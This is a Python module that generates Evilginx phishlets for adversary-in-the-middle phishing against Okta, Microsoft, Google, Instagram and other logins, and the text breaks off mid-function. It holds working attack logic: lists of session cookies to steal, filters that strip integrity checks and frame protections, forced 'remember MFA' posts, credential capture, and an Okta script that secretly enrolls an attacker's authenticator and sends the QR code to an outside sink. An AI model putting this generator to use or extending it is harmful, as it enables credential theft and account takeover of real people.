"""
Phishlet Generator — World-class Evilginx v3 phishlet YAML generator.

Informed by the Wavestone research article "Pushing Evilginx to its Limit" and
the official Evilginx phishlet specification. Generates production-grade
phishlets with:

- ``params`` for variable substitution (e.g. ``{okta_orga}``)
- Advanced ``sub_filters`` for CORS bypass, SRI integrity stripping,
  redirect-URI rewriting, and X-Frame-Options removal
- Multi-step ``js_inject`` for MFA enrollment automation,
  frame-buster bypass, and decoy-page redirects
- Proper ``force_post`` with ``force`` field (always present)
- ``credentials`` supporting ``type: json`` for API-based auth
- ``auth_urls`` covering KMSI and SAS endpoints
- Platform-specific templates for Okta, Azure, Google, Instagram, etc.
"""

import re
import logging
from io import StringIO
from typing import Optional
from urllib.parse import urlparse

from ruamel.yaml import YAML
from ruamel.yaml.comments import CommentedMap, CommentedSeq
from ruamel.yaml.scalarstring import SingleQuotedScalarString as SQ

from app.schemas.phishlet import (
    Phishlet, PhishletParam, ProxyHost, SubFilter, AuthTokenCookie,
    AuthTokenBody, AuthTokenHeader,
    CredentialField, Credentials, ForcePost, ForcePostSearch, ForcePostForce,
    JsInject, LoginConfig, PhishletGenerateResponse,
)
from app.schemas.analysis import AnalysisResult
from app.config import settings

logger = logging.getLogger(__name__)

# ──────────────────────────────────────────────────────────────────────────────
# Known session cookie names by platform (case-insensitive)
# ──────────────────────────────────────────────────────────────────────────────

KNOWN_SESSION_COOKIES: dict[str, list[str]] = {
    "microsoft": [
        "ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie",
        "ESTSAUTHLIGHT", "buid", "SDIDC", "JSHP", "x-ms-gateway-slice",
        "CCState", "MSPOK", "MUID", "wlidp",
    ],
    "google": [
        "SID", "HSID", "SSID", "APISID", "SAPISID", "OSID", "SIDCC", "NID",
        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID",
        "__Secure-3PAPISID", "LSID",
    ],
    "okta": [
        "sid", "idx", "okta-oauth-nonce", "okta-oauth-state", "DT", "t",
    ],
    "github": [
        "user_session", "_gh_sess", "logged_in", "dotcom_user",
        "__Host-user_session_same_site",
    ],
    "aws": ["aws-creds", "aws-userInfo", "noflush_awsccc", "aws-signer-token"],
    "facebook": ["c_user", "xs", "fr", "datr", "sb", "dpr", "wd", "spin"],
    "twitter": ["auth_token", "ct0", "twid", "kdt", "guest_id", "_twitter_sess"],
    "linkedin": ["li_at", "JSESSIONID", "liap", "li_mc", "bcookie", "bscookie", "li_sugr"],
    "discord": ["__dcfduid", "__sdcfduid", "__cfruid"],
    "slack": ["d", "d-s", "lc", "x", "b"],
    "salesforce": ["sid", "oid", "inst", "sfdc-stream", "BrowserId"],
    "zoom": ["_zm_ssid", "_zm_ctaid", "_zm_chtaid", "_zm_csp_script_nonce"],
    "auth0": ["auth0", "auth0_compat", "a0:session", "did", "did_compat"],
    "firebase": ["__session"],
    "dropbox": ["t", "gvc", "lid", "jar", "__Host-js_csrf", "__Host-ss"],
    "apple": ["myacinfo", "DSID", "dqsid", "acn01"],
    "atlassian": ["cloud.session.token", "tenant.session.token", "atlassian.xsrf.token"],
    "servicenow": ["glide_user", "glide_user_route", "glide_session_store", "JSESSIONID", "sysparm_ck"],
    "workday": ["PLAY_SESSION", "TS01", "wd-browser-id"],
    "sap": ["sap-usercontext", "MYSAPSSO2", "JSESSIONID"],
    "pingidentity": ["PF", "PA_ORIG_URL", "PA.session"],
    "onelogin": ["sub_session_onelogin.com", "ol_oidc_token"],
    "duo": ["DD_SID", "DD_TSES"],
    "azure_ad": ["AADSSO", "SSOCOOKIEPULLED", "x-ms-cpim-csrf"],
    "instagram": ["sessionid", "csrftoken", "ds_user_id", "ig_did", "rur"],
    "generic": [
        "session", "session_id", "PHPSESSID", "JSESSIONID",
        "connect.sid", "ASP.NET_SessionId", "auth_token",
        "access_token", "_csrf", "csrf_token", "XSRF-TOKEN",
        "laravel_session", "rack.session", "_session_id",
        "ci_session", "express.sid", "PLAY_SESSION",
    ],
}

ALL_KNOWN_COOKIES_CI: dict[str, str] = {}
for _cookies in KNOWN_SESSION_COOKIES.values():
    for _cookie in _cookies:
        ALL_KNOWN_COOKIES_CI[_cookie.lower()] = _cookie

NON_SESSION_COOKIE_PATTERNS = [
    r"^_ga", r"^_gid", r"^_gat", r"^_fbp", r"^_fbc",
    r"^_gcl", r"^_hjid", r"^_hj", r"^_dc_gtm",
    r"^__utm", r"^ajs_", r"^amplitude", r"^mp_",
    r"^intercom", r"^hubspot", r"^drift", r"^__stripe",
    r"consent", r"gdpr", r"cookie.?policy", r"OptanonConsent",
]

SESSION_COOKIE_PATTERNS = [
    r"sess", r"auth", r"token", r"sid", r"login",
    r"sso", r"jwt", r"csrf", r"xsrf",
]

# ──────────────────────────────────────────────────────────────────────────────
# Known credential fields
# ──────────────────────────────────────────────────────────────────────────────

KNOWN_USERNAME_FIELDS = [
    "email", "username", "user", "login", "loginfmt",
    "UserName", "user_email", "signin_email", "identifier",
    "email_address", "account", "userid", "user_id", "uid",
    "login_email", "j_username", "uname", "mail",
    "loginId", "accountName", "samAccountName", "principal",
]

KNOWN_PASSWORD_FIELDS = [
    "password", "passwd", "pass", "pwd", "Passwd",
    "Password", "user_password", "signin_password", "accesspass",
    "pin", "passcode", "passphrase", "secret",
    "j_password", "login_password", "credential", "user_pass",
    "loginPassword", "enc_password",
]

KNOWN_MFA_FIELDS = [
    "otp", "totp", "mfa_code", "verification_code",
    "otpCode", "verificationCode", "authcode", "security_code",
    "twoFactorCode", "mfaCode", "passcode",
]

# ──────────────────────────────────────────────────────────────────────────────
# Platform fingerprinting: detect target platform from URL/domain patterns
# ──────────────────────────────────────────────────────────────────────────────

PLATFORM_SIGNATURES: dict[str, dict] = {
    "okta": {
        "url_patterns": [r"okta\.com", r"oktapreview\.com"],
        "auth_cookies": ["sid", "idx"],
        "username_key": "identifier",
        "password_key": "passwd",
        "credential_type": "json",
        "auth_urls": ["/login/token/redirect", "/app/UserHome"],
        "kmsi_path": "/kmsi",
        "cdn_domains": ["oktacdn.com"],
        "needs_cors_bypass": True,
        "needs_sri_strip": True,
        "needs_redirect_uri_fix": True,
    },
    "microsoft": {
        "url_patterns": [r"microsoftonline\.com", r"office\.com", r"live\.com", r"microsoft\.com/login"],
        "auth_cookies": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"],
        "username_key": "loginfmt",
        "password_key": "passwd",
        "credential_type": "post",
        "auth_urls": ["/common/SAS/ProcessAuth", "/kmsi", "/common/oauth2/v2.0/authorize"],
        "kmsi_path": "/kmsi",
        "cdn_domains": ["msftauth.net", "aadcdn.msftauth.net"],
        "needs_cors_bypass": False,
        "needs_sri_strip": False,
        "needs_redirect_uri_fix": False,
        "needs_frame_buster_bypass": True,
    },
    "google": {
        "url_patterns": [r"accounts\.google\.com", r"myaccount\.google\.com"],
        "auth_cookies": ["SID", "HSID", "SSID", "APISID", "SAPISID"],
        "username_key": "identifier",
        "password_key": "Passwd",
        "credential_type": "post",
        "auth_urls": ["/ServiceLogin", "/signin/challenge"],
        "kmsi_path": None,
        "cdn_domains": [],
        "needs_cors_bypass": False,
        "needs_sri_strip": False,
        "needs_redirect_uri_fix": False,
    },
    "instagram": {
        "url_patterns": [r"instagram\.com"],
        "auth_cookies": ["sessionid", "csrftoken", "ds_user_id", "ig_did"],
        "username_key": "username",
        "password_key": "enc_password",
        "credential_type": "post",
        "auth_urls": ["/accounts/login/ajax/"],
        "kmsi_path": None,
        "cdn_domains": ["cdninstagram.com"],
        "needs_cors_bypass": False,
        "needs_sri_strip": False,
        "needs_redirect_uri_fix": False,
    },
}


def detect_platform(url: str, domains: list[str]) -> Optional[str]:
    """Detect the target platform from URL and discovered domains."""
    combined = (url + " " + " ".join(domains)).lower()
    for platform, sig in PLATFORM_SIGNATURES.items():
        for pattern in sig["url_patterns"]:
            if re.search(pattern, combined, re.IGNORECASE):
                return platform
    return None


# ──────────────────────────────────────────────────────────────────────────────
# Main Generator Class
# ──────────────────────────────────────────────────────────────────────────────

class PhishletGenerator:
    def __init__(self, ai_service=None):
        self.ai_service = ai_service

    async def generate(
        self,
        analysis: AnalysisResult,
        author: str = "@rtlphishletgen",
        use_ai: bool = False,
        custom_name: Optional[str] = None,
    ) -> PhishletGenerateResponse:
        warnings: list[str] = []
        suggestions: list[str] = []

        name = custom_name or analysis.suggested_name
        platform = detect_platform(
            analysis.target_url,
            [d.domain for d in analysis.discovered_domains],
        )

        # 1. Params (platform-specific variables)
        params = self._build_params(analysis, platform)

        # 2. Proxy Hosts
        proxy_hosts = self._build_proxy_hosts(analysis, platform)
        if not proxy_hosts:
            warnings.append("No proxy hosts could be determined. Manual configuration required.")

        # 3. Sub Filters
        sub_filters = self._build_sub_filters(analysis, proxy_hosts, platform)

        # 4. Auth Tokens
        auth_tokens = self._build_auth_tokens(analysis, platform)
        if not auth_tokens:
            warnings.append("No session cookies identified. You must manually add auth_tokens.")
            suggestions.append("Use browser DevTools (Application > Cookies) to identify session cookies after login.")

        # 5. Credentials
        credentials = self._build_credentials(analysis, platform)
        if not credentials.username:
            warnings.append("Username field not detected. Manual credential mapping needed.")
        if not credentials.password:
            warnings.append("Password field not detected. Manual credential mapping needed.")

        # 6. Auth URLs
        auth_urls = self._build_auth_urls(analysis, platform)

        # 7. Login
        login = self._build_login(analysis)

        # 8. Force Post
        force_post = self._build_force_post(analysis, credentials, platform)

        # 9. JS Inject
        js_inject = self._build_js_inject(analysis, platform)

        # 10. Redirect URL
        redirect_url = self._build_redirect_url(analysis)

        phishlet = Phishlet(
            name=name,
            author=author,
            min_ver=settings.evilginx_min_ver,
            params=params,
            proxy_hosts=proxy_hosts,
            sub_filters=sub_filters,
            auth_tokens=auth_tokens,
            credentials=credentials,
            auth_urls=auth_urls,
            login=login,
            force_post=force_post,
            js_inject=js_inject,
            redirect_url=redirect_url,
        )

        # 11. AI Refinement (optional)
        if use_ai and self.ai_service and settings.ai_enabled:
            try:
                refined = await self.ai_service.refine_phishlet(phishlet, analysis)
                if refined:
                    phishlet = refined
                    suggestions.append("Phishlet was refined using AI analysis.")
            except Exception as e:
                warnings.append(f"AI refinement failed: {str(e)}. Using rule-based output.")

        # 12. Serialize to YAML
        yaml_content = self._serialize_to_yaml(phishlet)

        return PhishletGenerateResponse(
            yaml_content=yaml_content,
            phishlet=phishlet,
            warnings=warnings,
            suggestions=suggestions,
        )

    # ──────────────────────────────────────────────────────────────────────
    # Params
    # ──────────────────────────────────────────────────────────────────────

    def _build_params(self, analysis: AnalysisResult, platform: Optional[str]) -> list[PhishletParam]:
        params: list[PhishletParam] = []

        if platform == "okta":
            # Extract tenant name from URL (e.g. trial-12345.okta.com)
            parsed = urlparse(analysis.target_url)
            host = parsed.netloc.split(":")[0]
            parts = host.replace(".okta.com", "").replace(".oktapreview.com", "")
            tenant = parts if parts else ""
            params.append(PhishletParam(name="okta_orga", default=tenant, required=True))
            params.append(PhishletParam(name="redirect_server", default="https://google.com", required=False))

        return params

    # ──────────────────────────────────────────────────────────────────────
    # Proxy Hosts
    # ──────────────────────────────────────────────────────────────────────

    def _build_proxy_hosts(self, analysis: AnalysisResult, platform: Optional[str]) -> list[ProxyHost]:
        hosts: list[ProxyHost] = []
        target_parsed = urlparse(analysis.target_url)
        target_domain = self._extract_base_domain(target_parsed.netloc)
        target_sub = target_parsed.netloc.replace(f".{target_domain}", "").replace(target_domain, "")
        if target_sub.endswith("."):
            target_sub = target_sub[:-1]

        landing_set = False

        for dd in analysis.discovered_domains:
            is_target = dd.domain == target_domain
            if dd.is_cdn and not dd.is_auth_related and not dd.is_cdn_static:
                continue

            if is_target or dd.is_auth_related:
                is_landing = is_target and not landing_set

                # For Okta, use {okta_orga} as phish_sub/orig_sub
                if platform == "okta" and "okta.com" in dd.domain:
                    phish_sub = "{okta_orga}" if is_target else ""
                    orig_sub = "{okta_orga}" if is_target else ""
                else:
                    phish_sub = target_sub if is_target else ""
                    orig_sub = target_sub if is_target else ""

                hosts.append(ProxyHost(
                    phish_sub=phish_sub,
                    orig_sub=orig_sub,
                    domain=dd.domain,
                    session=dd.is_auth_related or is_target,
                    is_landing=is_landing,
                    auto_filter=True,
                ))
                if is_landing:
                    landing_set = True

                for sub in dd.subdomains:
                    if is_target and sub == target_sub:
                        continue
                    # For Okta CDN, include it even though it's a CDN
                    if platform == "okta" and "oktacdn" in dd.domain:
                        hosts.append(ProxyHost(
                            phish_sub=sub,
                            orig_sub=sub,
                            domain=dd.domain,
                            session=False,
                            is_landing=False,
                            auto_filter=True,
                        ))
                    else:
                        hosts.append(ProxyHost(
                            phish_sub=sub,
                            orig_sub=sub,
                            domain=dd.domain,
                            session=dd.is_auth_related,
                            is_landing=False,
                            auto_filter=True,
                        ))

        # Deduplicate
        seen: set[tuple[str, str, str]] = set()
        deduped: list[ProxyHost] = []
        for host in hosts:
            key = (host.phish_sub, host.orig_sub, host.domain)
            if key not in seen:
                seen.add(key)
                deduped.append(host)
        hosts = deduped

        if not landing_set and hosts:
            hosts[0].is_landing = True

        return hosts

    # ──────────────────────────────────────────────────────────────────────
    # Sub Filters
    # ──────────────────────────────────────────────────────────────────────

    def _build_sub_filters(
        self, analysis: AnalysisResult, proxy_hosts: list[ProxyHost], platform: Optional[str],
    ) -> list[SubFilter]:
        filters: list[SubFilter] = []
        standard_mimes = ["text/html", "application/json", "application/javascript", "text/javascript"]
        js_mimes = ["application/javascript"]
        html_mimes = ["text/html", "charset=utf-8"]

        landing_hosts = [h for h in proxy_hosts if h.is_landing]
        if not landing_hosts:
            landing_hosts = proxy_hosts[:1]

        # ── Standard domain-rewriting sub_filters ──
        for host in proxy_hosts:
            full_orig = f"{host.orig_sub}.{host.domain}" if host.orig_sub else host.domain
            for trigger in landing_hosts:
                trigger_full = f"{trigger.orig_sub}.{trigger.domain}" if trigger.orig_sub else trigger.domain
                if full_orig != trigger_full:
                    filters.append(SubFilter(
                        triggers_on=trigger_full,
                        orig_sub=host.orig_sub,
                        domain=host.domain,
                        search=full_orig,
                        replace=full_orig,
                        mimes=standard_mimes,
                    ))
                    encoded = full_orig.replace(".", "%2E")
                    if encoded != full_orig:
                        filters.append(SubFilter(
                            triggers_on=trigger_full,
                            orig_sub=host.orig_sub,
                            domain=host.domain,
                            search=encoded,
                            replace=encoded,
                            mimes=standard_mimes,
                        ))

        # ── Platform-specific advanced sub_filters ──
        if platform == "okta":
            okta_cdn = "ok14static.oktacdn.com"
            okta_tenant = "{okta_orga}.okta.com"

            # CORS bypass: rewrite redirectUri in Okta JS
            filters.append(SubFilter(
                triggers_on=okta_cdn,
                orig_sub="",
                domain="okta.com",
                search='array");var t=',
                replace='array");e.redirectUri=e.redirectUri.replace("{basedomain}","{orig_domain}");var t=',
                mimes=js_mimes,
            ))

            # SRI integrity hash stripping
            filters.append(SubFilter(
                triggers_on=okta_tenant,
                orig_sub="",
                domain="okta.com",
                search='integrity="[^"]*"',
                replace="integrity=''",
                mimes=html_mimes,
            ))
            filters.append(SubFilter(
                triggers_on=okta_tenant,
                orig_sub="",
                domain="okta.com",
                search="mainScript\\.integrity",
                replace="mainScript.inteegrity",
                mimes=html_mimes,
            ))

            # Redirect URI fix: ensure callback stays on okta.com
            filters.append(SubFilter(
                triggers_on=okta_cdn,
                orig_sub="",
                domain="okta.com",
                search="var s=\\(n\\.g\\.fetch\\|\\|h\\(\\)\\)\\(t",
                replace='t=t.replace("{orig_domain}","{domain}");var s=(n.g.fetch||h())(t',
                mimes=js_mimes,
            ))
            filters.append(SubFilter(
                triggers_on=okta_cdn,
                orig_sub="",
                domain="okta.com",
                search=",l\\.src=e\\.getIssuerOrigin\\(\\)",
                replace=',l.src=e.getIssuerOrigin().replace("{orig_domain}","{domain}")',
                mimes=js_mimes,
            ))

        elif platform == "microsoft":
            msft_login = "login.microsoftonline.com"

            # Frame buster bypass: self === top
            filters.append(SubFilter(
                triggers_on=msft_login,
                orig_sub="",
                domain="microsoftonline.com",
                search="if(e.self===e.top){",
                replace="if(true){window.oldself=e.self;e.self=e.top;",
                mimes=html_mimes,
            ))

            # Frame buster bypass: target=_top removal
            filters.append(SubFilter(
                triggers_on=msft_login,
                orig_sub="",
                domain="microsoftonline.com",
                search='method="post" target="_top"',
                replace='method="post"',
                mimes=html_mimes,
            ))

            # Framework-specific: force form action
            filters.append(SubFilter(
                triggers_on=msft_login,
                orig_sub="",
                domain="microsoftonline.com",
                search="autoSubmit: forceSubmit, attr: { action: postUrl }",
                replace="autoSubmit: forceSubmit, attr: { action: \\'/common/login\\' }",
                mimes=html_mimes,
            ))

            # X-Frame-Options removal
            if analysis.x_frame_options:
                filters.append(SubFilter(
                    triggers_on=msft_login,
                    orig_sub="",
                    domain="microsoftonline.com",
                    search="X-Frame-Options: DENY",
                    replace="Test: Test",
                    mimes=["*"],
                ))

        return filters

    # ──────────────────────────────────────────────────────────────────────
    # Auth Tokens
    # ──────────────────────────────────────────────────────────────────────

    def _build_auth_tokens(self, analysis: AnalysisResult, platform: Optional[str]) -> list[AuthTokenCookie]:
        tokens: list[AuthTokenCookie] = []

        # Platform-specific overrides
        if platform and platform in PLATFORM_SIGNATURES:
            sig = PLATFORM_SIGNATURES[platform]
            for domain in analysis.discovered_domains:
                if domain.is_auth_related:
                    cookie_domain = domain.domain if domain.domain.startswith(".") else f".{domain.domain}"
                    tokens.append(AuthTokenCookie(
                        domain=cookie_domain,
                        keys=sig["auth_cookies"],
                    ))
                    return tokens

        # Auto-detect from observed cookies
        for domain, cookie_names in analysis.cookies_observed.items():
            relevant: list[str] = []
            for cookie in cookie_names:
                if any(re.search(neg, cookie, re.IGNORECASE) for neg in NON_SESSION_COOKIE_PATTERNS):
                    continue
                if cookie.lower() in ALL_KNOWN_COOKIES_CI:
                    relevant.append(cookie)
                    continue
                for pattern in SESSION_COOKIE_PATTERNS:
                    if re.search(pattern, cookie, re.IGNORECASE):
                        relevant.append(cookie)
                        break
            if relevant:
                cookie_domain = domain if domain.startswith(".") else f".{domain}"
                tokens.append(AuthTokenCookie(domain=cookie_domain, keys=sorted(set(relevant))))

        return tokens

    # ──────────────────────────────────────────────────────────────────────
    # Credentials
    # ──────────────────────────────────────────────────────────────────────

    def _build_credentials(self, analysis: AnalysisResult, platform: Optional[str]) -> Credentials:
        username_field: Optional[CredentialField] = None
        password_field: Optional[CredentialField] = None
        custom_fields: list[CredentialField] = []

        # Platform-specific defaults
        if platform and platform in PLATFORM_SIGNATURES:
            sig = PLATFORM_SIGNATURES[platform]
            username_field = CredentialField(
                key=sig["username_key"],
                search="(.*)" if sig["credential_type"] == "post" else f'"{sig["username_key"]}":"([^"]*)"',
                type=sig["credential_type"],
            )
            password_field = CredentialField(
                key=sig["password_key"],
                search="(.*)",
                type=sig["credential_type"],
            )

        def _match_username(field) -> bool:
            candidates = [
                (field.field_name or "").lower(),
                (field.field_id or "").lower(),
                (field.placeholder or "").lower(),
                (field.label or "").lower(),
            ]
            return any(
                any(un.lower() in c for un in KNOWN_USERNAME_FIELDS)
                for c in candidates if c
            )

        def _match_password(field) -> bool:
            if field.field_type == "password":
                return True
            candidates = [(field.field_name or "").lower(), (field.field_id or "").lower()]
            return any(
                any(pw.lower() in c for pw in KNOWN_PASSWORD_FIELDS)
                for c in candidates if c
            )

        def _match_mfa(field) -> bool:
            candidates = [
                (field.field_name or "").lower(),
                (field.field_id or "").lower(),
                (field.placeholder or "").lower(),
                (field.label or "").lower(),
            ]
            return any(
                any(mfa.lower() in c for mfa in KNOWN_MFA_FIELDS)
                for c in candidates if c
            )

        # Only override platform defaults if we don't have them yet
        for form in analysis.login_forms:
            for field in form.fields:
                if field.field_type == "hidden":
                    continue
                key = field.field_name or field.field_id or ""
                if not key:
                    continue

                if not username_field and field.field_type in ("email", "text", "tel"):
                    if _match_username(field):
                        username_field = CredentialField(key=key, search="(.*)", type="post")

                if not password_field and _match_password(field):
                    password_field = CredentialField(key=key, search="(.*)", type="post")

                if _match_mfa(field):
                    custom_fields.append(CredentialField(key=key, search="(.*)", type="post"))

        # Fallbacks
        if not username_field:
            username_field = CredentialField(
                key="(email|username|login|user|loginfmt|identifier|account)",
                search="(.*)", type="post",
            )
        if not password_field:
            password_field = CredentialField(
                key="(password|passwd|pwd|Passwd|Password|enc_password|pass)",
                search="(.*)", type="post",
            )

        return Credentials(
            username=username_field,
            password=password_field,
            custom=custom_fields if custom_fields else None,
        )

    # ──────────────────────────────────────────────────────────────────────
    # Auth URLs
    # ──────────────────────────────────────────────────────────────────────

    def _build_auth_urls(self, analysis: AnalysisResult, platform: Optional[str]) -> list[str]:
        urls: list[str] = []

        # Platform-specific auth_urls
        if platform and platform in PLATFORM_SIGNATURES:
            sig = PLATFORM_SIGNATURES[platform]
            urls.extend(sig.get("auth_urls", []))

        if analysis.post_login_url:
            urls.append(analysis.post_login_url)

        post_login_patterns = [
            "/dashboard", "/home", "/main", "/portal",
            "/account", "/app", "/inbox", "/feed",
            "/my", "/workspace", "/console", "/admin",
            "/profile", "/overview", "/landing",
            "/callback", "/oauth/callback", "/auth/callback",
            "/signin-oidc", "/auth/complete",
            "/app/UserHome",
        ]
        for redirect_url in reversed(analysis.redirect_chain):
            parsed = urlparse(redirect_url)
            for pattern in post_login_patterns:
                if parsed.path.lower().startswith(pattern):
                    urls.append(parsed.path)

        token_patterns = ["/token", "/oauth2/token", "/oauth/token", "/api/v1/authn"]
        for endpoint in analysis.auth_api_endpoints:
            parsed = urlparse(endpoint)
            for pattern in token_patterns:
                if pattern in parsed.path.lower():
                    urls.append(parsed.path)

        result = list(dict.fromkeys(u for u in urls if u))
        if not result:
            result = ["/.*"]
        return result

    # ──────────────────────────────────────────────────────────────────────
    # Login
    # ──────────────────────────────────────────────────────────────────────

    def _build_login(self, analysis: AnalysisResult) -> LoginConfig:
        parsed = urlparse(analysis.target_url)
        domain = parsed.netloc.split(":")[0]
        path = parsed.path or "/"

        # For Okta, use the param-based domain
        if "okta.com" in domain:
            domain = "{okta_orga}.okta.com"

        return LoginConfig(domain=domain, path=path)

    # ──────────────────────────────────────────────────────────────────────
    # Force Post (always includes 'force' field)
    # ──────────────────────────────────────────────────────────────────────

    def _build_force_post(
        self, analysis: AnalysisResult, credentials: Credentials, platform: Optional[str],
    ) -> list[ForcePost]:
        force_posts: list[ForcePost] = []
        csrf_indicators = [
            "csrf", "xsrf", "token", "_token",
            "authenticity", "nonce", "requestverification",
        ]

        # ── Platform-specific force_posts ──
        if platform == "microsoft":
            # KMSI auto-accept
            force_posts.append(ForcePost(
                path="/kmsi",
                search=[ForcePostSearch(key="LoginOptions", search=".*")],
                force=[ForcePostForce(key="LoginOptions", value="1")],
                type="post",
            ))
            # MFA persistence auto-accept
            force_posts.append(ForcePost(
                path="/common/SAS",
                search=[ForcePostSearch(key="rememberMFA", search=".*")],
                force=[ForcePostForce(key="rememberMFA", value="true")],
                type="post",
            ))
            return force_posts

        if platform == "okta":
            # KMSI auto-accept for Okta
            force_posts.append(ForcePost(
                path="/kmsi",
                search=[ForcePostSearch(key="LoginOptions", search=".*")],
                force=[ForcePostForce(key="LoginOptions", value="1")],
                type="post",
            ))
            return force_posts

        # ── Generic force_post from detected forms ──
        for form in analysis.login_forms:
            if form.method != "POST":
                continue

            action_url = form.action_url or analysis.target_url
            parsed = urlparse(action_url)
            search_items: list[ForcePostSearch] = []
            force_items: list[ForcePostForce] = []

            if credentials.username:
                search_items.append(ForcePostSearch(key=credentials.username.key, search="(.*)"))
            if credentials.password:
                search_items.append(ForcePostSearch(key=credentials.password.key, search="(.*)"))

            for field in form.fields:
                if field.field_type == "hidden" and field.field_name:
                    name_lower = field.field_name.lower()
                    if any(ind in name_lower for ind in csrf_indicators):
                        search_items.append(ForcePostSearch(key=field.field_name, search="(.*)"))
                        force_items.append(ForcePostForce(
                            key=field.field_name,
                            value=field.field_value or "",
                        ))

            if search_items:
                force_posts.append(ForcePost(
                    path=parsed.path or "/",
                    search=search_items,
                    force=force_items,
                    type="post",
                ))

        # Fallback: auth API endpoints
        if not force_posts and analysis.auth_api_endpoints:
            for endpoint in analysis.auth_api_endpoints[:3]:
                parsed = urlparse(endpoint)
                if any(kw in parsed.path.lower() for kw in ["/login", "/signin", "/authenticate", "/auth"]):
                    search_items = []
                    if credentials.username:
                        search_items.append(ForcePostSearch(key=credentials.username.key, search="(.*)"))
                    if credentials.password:
                        search_items.append(ForcePostSearch(key=credentials.password.key, search="(.*)"))
                    if search_items:
                        force_posts.append(ForcePost(
                            path=parsed.path,
                            search=search_items,
                            force=[],
                            type="post",
                        ))
                        break

        return force_posts

    # ──────────────────────────────────────────────────────────────────────
    # JS Inject
    # ──────────────────────────────────────────────────────────────────────

    def _build_js_inject(self, analysis: AnalysisResult, platform: Optional[str]) -> list[JsInject]:
        injects: list[JsInject] = []

        # ── Platform-specific JS injections ──
        if platform == "okta":
            okta_tenant = "{okta_orga}.okta.com"

            # Step 1: Redirect to decoy page after first auth
            injects.append(JsInject(
                trigger_domains=[okta_tenant],
                trigger_paths=["/app/UserHome"],
                script=(
                    "if(document.referrer.indexOf('/enduser/callback') != -1){"
                    "document.location = 'https://'+window.location.hostname+'/help/login'"
                    "}"
                ),
            ))

            # Step 2: Enumerate MFA authenticators and redirect to setup
            injects.append(JsInject(
                trigger_domains=[okta_tenant],
                trigger_paths=["/help/login"],
                script=(
                    "function u4tyd783z(){"
                    "fetch('/api/v1/authenticators')"
                    ".then((data) => {"
                    "data.json().then((jData)=>{"
                    "let id = undefined;"
                    "for(let elt of jData){"
                    "if(elt.key == 'okta_verify'){id = elt.id}"
                    "}"
                    "if(id == undefined){return}"
                    "document.location = 'https://'+window.location.hostname+'/idp/authenticators/setup/'+id"
                    "})})}"
                    "u4tyd783z();"
                ),
            ))

            # Step 3: Automate MFA enrollment and exfil QR code
            injects.append(JsInject(
                trigger_domains=[okta_tenant],
                trigger_paths=["/idp/authenticators/setup/.*"],
                script=(
                    "function u720dhfn2(){"
                    "if(document.querySelectorAll('.button.select-factor.link-button').length > 0){"
                    "document.querySelectorAll('.button.select-factor.link-button')[0].click();"
                    "document.querySelectorAll('body')[0].style.display = 'none';}"
                    "if(document.querySelectorAll('a.orOnMobileLink').length > 0){"
                    "document.querySelectorAll('a.orOnMobileLink')[0].click();}"
                    "if(document.querySelectorAll('img.qrcode').length > 0){"
                    "fetch('{qrcode_sink}', {method:'POST',"
                    "body:JSON.stringify({code:document.querySelectorAll('img.qrcode')[0].getAttribute('src')})"
                    "}).then(()=>{document.location='{redirect_server}'})"
                    ".catch(()=>{document.location='{redirect_server}'});"
                    "clearInterval(myInterval)}}"
                    "var myInterval = setInterval(function(){u720dhfn2()}, 10)"
                ),
            ))

            return injects

        if platform == "microsoft":
            msft_login = "login.microsoftonline.com"

            # Frame buster bypass: self === top check
            injects.append(JsInject(
                trigger_domains=[msft_login],
                trigger_paths=["/"],
                script=(
                    "// Frame buster bypass\n"
                    "try { if (window.self !== window.top) { "
                    "window.oldself = window.self; window.self = window.top; "
                    "} } catch(e) {}"
                ),
            ))

            return injects

        # ── Generic JS injection for SPA auth interception ──
        if not analysis.uses_javascript_auth:
            return []

        parsed = urlparse(analysis.target_url)
        target_host = parsed.netloc

        auth_paths = []
        for endpoint in analysis.auth_api_endpoints:
            ep_parsed = urlparse(endpoint)
            if any(kw in ep_parsed.path.lower() for kw in ["/login", "/signin", "/auth", "/token", "/session", "/api/auth"]):
                auth_paths.append(ep_parsed.path)

        paths_regex = "|".join(re.escape(p) for p in auth_paths) if auth_paths else "/login|/auth|/signin|/api/auth"

        script = (
            "// SPA authentication interception\n"
            "(function() {\n"
            "  var origFetch = window.fetch;\n"
            "  window.fetch = function(url, opts) {\n"
            "    try {\n"
            "      var urlStr = (typeof url === 'string') ? url : (url.url || '');\n"
            f"      if (/{paths_regex}/.test(urlStr) && opts && opts.body) {{\n"
            "        // Credential data intercepted via fetch\n"
            "      }\n"
            "    } catch(e) {}\n"
            "    return origFetch.apply(this, arguments);\n"
            "  };\n"
            "  var origOpen = XMLHttpRequest.prototype.open;\n"
            "  var origSend = XMLHttpRequest.prototype.send;\n"
            "  XMLHttpRequest.prototype.open = function(method, url) {\n"
            "    this._url = url;\n"
            "    return origOpen.apply(this, arguments);\n"
            "  };\n"
            "  XMLHttpRequest.prototype.send = function(body) {\n"
            "    try {\n"
            f"      if (this._url && /{paths_regex}/.test(this._url) && body) {{\n"
            "        // Credential data intercepted via XHR\n"
            "      }\n"
            "    } catch(e) {}\n"
            "    return origSend.apply(this, arguments);\n"
            "  };\n"
            "  document.addEventListener('submit', function(e) {\n"
            "    var form = e.target;\n"
            "    if (form && form.tagName === 'FORM') {\n"
            "      // Form submission intercepted\n"
            "    }\n"
            "  }, true);\n"
            "})();\n"
        )

        return [JsInject(
            trigger_domains=[target_host],
            trigger_paths=[parsed.path or "/.*"],
            trigger_params=[],
            script=script,
        )]

    # ──────────────────────────────────────────────────────────────────────
    # Redirect URL
    # ──────────────────────────────────────────────────────────────────────

    def _build_redirect_url(self, analysis: AnalysisResult) -> Optional[str]:
        if analysis.post_login_url:
            return analysis.post_login_url
        return None

    # ──────────────────────────────────────────────────────────────────────
    # YAML Serialization
    # ──────────────────────────────────────────────────────────────────────

    def _serialize_to_yaml(self, phishlet: Phishlet) -> str:
        yaml = YAML()
        yaml.default_flow_style = False
        yaml.indent(mapping=2, sequence=4, offset=2)
        yaml.width = 120

        doc = CommentedMap()
        doc["name"] = SQ(phishlet.name)
        doc["author"] = SQ(phishlet.author)
        doc["min_ver"] = SQ(phishlet.min_ver)

        # params
        if phishlet.params:
            p_seq = CommentedSeq()
            for p in phishlet.params:
                entry = CommentedMap()
                entry["name"] = SQ(p.name)
                entry["default"] = SQ(p.default)
                if p.required:
                    entry["required"] = p.required
